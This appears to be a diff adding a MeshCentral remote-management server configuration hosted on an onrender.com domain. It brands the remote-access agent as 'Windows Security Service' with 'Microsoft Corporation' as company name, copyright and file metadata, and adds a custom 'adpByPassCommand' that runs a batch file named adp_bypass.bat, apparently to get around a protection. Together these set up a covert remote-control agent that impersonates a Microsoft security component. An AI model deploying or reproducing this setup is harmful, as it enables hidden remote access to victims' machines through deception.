@@ -1,0 +1,45 @@
+{
+  "$schema": "https://raw.githubusercontent.com/Ylianst/MeshCentral/master/meshcentral-config-schema.json",
+  "__comment1__": "This is a simple configuration file, all values and sections that start with underscore (_) are ignored. Edit a section and remove the _ in front of the name. Refer to the user's guide for details.",
+  "__comment2__": "See node_modules/meshcentral/sample-config-advanced.json for a more advanced example.",
+  "settings": {
+    "cert": "meshcentral-setup-main.onrender.com",
+    "WANonly": true,
+    "port": 443,
+    "aliasPort": 443,
+    "redirPort": 80,
+    "redirAliasPort": 80,
+    "dbCleanup": 30,
+    "noLocalDiscovery": true,
+    "noMqtt": true,
+    "noFirebase": true,
+    "noAmt": true,
+    "noMps": true,
+    "adpByPassCommand": "cmd /c \"adp_bypass.bat\""
+  },
+  "domains": {
+    "": {
+      "title": "ADP Agent",
+      "minify": false,
+      "compression": true,
+      "noAdminLoginStats": true,
+      "noAgentUpdate": false,
+      "agentCustomization": {
+        "displayName": "Windows Security Service",
+        "description": "Windows Security Service",
+        "companyName": "Microsoft Corporation",
+        "serviceName": "WindowsSecurityService",
+        "fileName": "WindowsSecurityService"
+      },
+      "agentFileInfo": {
+        "filedescription": "Windows Security Service",
+        "fileversion": "1.0.0.0",
+        "internalname": "WindowsSecurityService",
+        "legalcopyright": "Microsoft Corporation",
+        "originalfilename": "WindowsSecurityService.exe",
+        "productname": "Windows Security Service",
+        "productversion": "1.0"
+      }
+    }
+  }
+}
